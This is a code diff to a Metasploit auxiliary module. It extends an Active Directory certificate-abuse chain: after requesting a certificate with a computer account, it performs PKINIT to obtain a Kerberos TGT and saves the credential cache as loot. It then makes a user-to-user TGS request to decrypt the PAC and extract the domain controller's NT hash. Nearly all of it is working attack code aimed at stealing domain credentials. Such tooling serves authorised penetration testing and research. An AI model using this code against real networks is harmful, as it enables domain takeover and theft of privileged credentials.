@@ -5,6 +5,10 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client::Authenticated
+  alias connect_smb_client connect
+
+  include Msf::Exploit::Remote::Kerberos::Client
+
   include Msf::Exploit::Remote::LDAP
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::MsIcpr
@@ -81,7 +85,11 @@ class MetasploitModule < Msf::Auxiliary
       password: computer_info.password
     }
     opts[:tree] = connect_smb(opts)
-    request_certificate(opts)
+    cert = request_certificate(opts)
+
+    credential, key = get_tgt(cert)
+
+    get_ntlm_hash(credential, key)
   rescue MsSamrConnectionError, MsIcprConnectionError => e
     fail_with(Failure::Unreachable, e.message)
   rescue MsSamrAuthentcationError, MsIcprAuthentcationError => e
@@ -126,7 +134,7 @@ class MetasploitModule < Msf::Auxiliary
     domain = opts[:domain] || datastore['SMBDomain']
     vprint_status("Connecting SMB with #{username}.#{domain}:#{password}")
     begin
-      connect
+      connect_smb_client
     rescue Rex::ConnectionError, RubySMB::Error::RubySMBError => e
       fail_with(Failure::Unreachable, e.message)
     end
@@ -269,6 +277,123 @@ class MetasploitModule < Msf::Auxiliary
     end
   rescue Net::LDAP::Error => e
     print_error("LDAP error: #{e.class}: #{e.message}")
+  end
+
+  def get_tgt(cert)
+    dc_name = datastore['DC_NAME'].dup.downcase
+    dc_name += '$' if !dc_name.ends_with?('$')
+    username, realm = extract_user_and_realm(cert.certificate, dc_name, datastore['SMBDomain'])
+    print_status("Attempting PKINIT login for #{username}@#{realm}")
+    begin
+      server_name = "krbtgt/#{realm}"
+      tgt_result, key = send_request_tgt_pkinit(pfx: cert,
+                                                username: username,
+                                                realm: realm,
+                                                server_name: server_name,
+                                                rport: 88)
+      print_good('Successfully authenticated with certificate')
+      enc_part = decrypt_kdc_as_rep_enc_part(tgt_result.as_rep, key.value)
+
+      info = []
+      info << "realm: #{realm.upcase}"
+      info << "serviceName: #{server_name.downcase}"
+      info << "username: #{username.downcase}"
+
+      ccache = Rex::Proto::Kerberos::CredentialCache::Krb5Ccache.from_responses(tgt_result.as_rep, enc_part)
+      path = store_loot('mit.kerberos.ccache', 'application/octet-stream', rhost, ccache.encode, nil, info.join(', '))
+      print_status("#{peer} - TGT MIT Credential Cache saved to #{path}")
+
+      [ccache.credentials.first, key]
+    rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
+      print_error("Failed: #{e.message}")
+    end
+  end
+
+  def get_ntlm_hash(credential, key)
+    dc_name = datastore['DC_NAME'].dup.downcase
+    dc_name += '$' if !dc_name.ends_with?('$')
+    print_status("Trying to retrieve NT hash for #{dc_name}")
+
+    realm = datastore['SMBDomain'].upcase
+
+    sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
+      name_type: Rex::Proto::Kerberos::Model::NameType::NT_UNKNOWN,
+      name_string: [ dc_name ]
+    )
+
+    client_name = dc_name
+
+    now = Time.now.utc
+    expiry_time = now + 1.day
+
+    ticket_options = Rex::Proto::Kerberos::Model::KdcOptionFlags.from_flags(
+      [
+        Rex::Proto::Kerberos::Model::KdcOptionFlag::FORWARDABLE,
+        Rex::Proto::Kerberos::Model::KdcOptionFlag::RENEWABLE,
+        Rex::Proto::Kerberos::Model::KdcOptionFlag::CANONICALIZE,
+        Rex::Proto::Kerberos::Model::KdcOptionFlag::ENC_TKT_IN_SKEY,
+        Rex::Proto::Kerberos::Model::KdcOptionFlag::RENEWABLE_OK,
+      ]
+    )
+
+    ticket = Rex::Proto::Kerberos::Model::Ticket.decode(credential.ticket.value)
+    session_key = Rex::Proto::Kerberos::Model::EncryptionKey.new(
+      type: credential.keyblock.enctype.value,
+      value: credential.keyblock.data.value
+    )
+
+    tgs_res = send_request_tgs(
+      req: build_tgs_request(
+        {
+          session_key: session_key,
+          subkey: nil,
+          checksum: nil,
+          ticket: ticket,
+          realm: realm,
+          client_name: client_name,
+
+          body: build_tgs_request_body(
+            cname: nil,
+            sname: sname,
+            realm: realm,
+            etype: [ticket.enc_part.etype],
+            options: ticket_options,
+
+            # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
+            from: nil,
+            till: expiry_time,
+            rtime: nil,
+
+            # certificate time
+            ctime: now,
+
+            additional_tickets: [ticket]
+          )
+        }
+      ),
+      rport: 88
+    )
+
+    # Verify error codes
+    if tgs_res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
+      raise ::Rex::Proto::Kerberos::Model::Error::KerberosError.new(res: tgs_res)
+    end
+
+    print_good("#{peer} - Received a valid TGS-Response")
+
+    enc_tgs_ticket = tgs_res.ticket.enc_part.decrypt_asn1(
+      session_key.value,
+      Rex::Proto::Kerberos::Crypto::KeyUsage::KDC_REP_TICKET
+    )
+
+    tgs_ticket = Rex::Proto::Kerberos::Model::TicketEncPart.decode(enc_tgs_ticket)
+    value = OpenSSL::ASN1.decode(tgs_ticket.authorization_data.elements[0][:data]).value[0].value[1].value[0].value
+    pac_type = Rex::Proto::Kerberos::Pac::Type.new
+    auth_data = pac_type.decode(value)
+    cred_info = auth_data.buffers.find { |buffer| buffer.is_a?(Rex::Proto::Kerberos::Pac::CredentialInfo) }
+    serialized_pac_credential_data = cred_info.decrypt_serialized_data(key.value)
+
+    cred_info.extract_ntlm_hash(serialized_pac_credential_data)
   end
 
 end
